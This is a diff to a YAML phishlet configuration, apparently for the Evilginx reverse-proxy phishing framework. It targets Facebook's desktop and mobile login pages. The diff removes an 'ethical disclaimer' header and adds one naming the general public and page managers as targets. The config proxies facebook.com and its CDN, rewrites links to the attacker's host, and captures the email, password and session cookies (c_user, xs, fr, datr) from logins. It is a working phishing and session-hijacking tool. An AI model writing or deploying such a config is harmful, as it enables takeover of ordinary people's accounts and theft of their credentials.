@@ -1,13 +1,20 @@
-# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
+# PHISHLET FINAL : FACEBOOK (VANTABLACK SOCIAL POWER)
+# CIBLE : GRAND PUBLIC & GESTIONNAIRES DE PAGES
+# OPTIMISÉ POUR MOBILE (M.FACEBOOK.COM)
 min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false}
+
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://www.facebook.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://m.facebook.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
+
 auth_tokens:
   - domain: '.facebook.com'
-    keys: ['c_user', 'xs', 'fr', 'datr', 'sb']
+    keys: ['c_user', 'xs', 'fr', 'datr']
+
 credentials:
   username:
     key: 'email'
@@ -17,6 +24,7 @@ credentials:
     key: 'pass'
     search: '(.*)'
     type: 'post'
+
 login:
   domain: 'www.facebook.com'
-  path: '/login/'
+  path: '/login.php'
